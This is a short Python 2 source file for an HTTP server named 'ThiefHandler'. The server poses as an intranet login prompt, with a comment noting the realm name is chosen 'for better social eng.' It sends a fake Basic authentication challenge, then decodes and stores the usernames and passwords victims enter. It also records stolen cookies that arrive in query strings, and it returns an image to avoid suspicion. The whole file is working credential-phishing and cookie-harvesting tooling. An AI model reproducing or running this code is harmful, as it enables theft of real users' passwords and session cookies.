from BaseHTTPServer import BaseHTTPRequestHandler
from httpparser import HttpParser
from sqlstore import DB

hp = HttpParser()
store = DB()

class ThiefHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        clientip = str(self.client_address[0])
        header_tab = hp.ParseHeaders(self.headers)
        Authorization = hp.HasHeader('Authorization', header_tab)
        Referer = hp.HasHeader('Referer', header_tab)
        if Authorization:
            cred_b64 = Authorization
            self.log_message('credentials sent by: %s [%s]' % (clientip, cred_b64))
            username, password = hp.ParseB64Credentials(cred_b64)
            store.insert_cred(clientip, username, password, Referer)
            self.send_response(200)
            self.send_header('Content-type', 'image/bmp')
            self.end_headers()
            bitmap_dump = open('bg.bmp', 'r').readlines()
            self.wfile.write(bitmap_dump[0])
        else:
            qmindex = self.path.find('?')+1
            if qmindex:
                cookies = self.path[qmindex:]
                store.insert_cookie(clientip, cookies, Referer)
            self.send_response(401)
            self.log_message('sending 401 to: ' + clientip)
            self.send_header('WWW-Authenticate', 'Basic realm="intra static"') #provide a realm for better social eng.
            self.end_headers()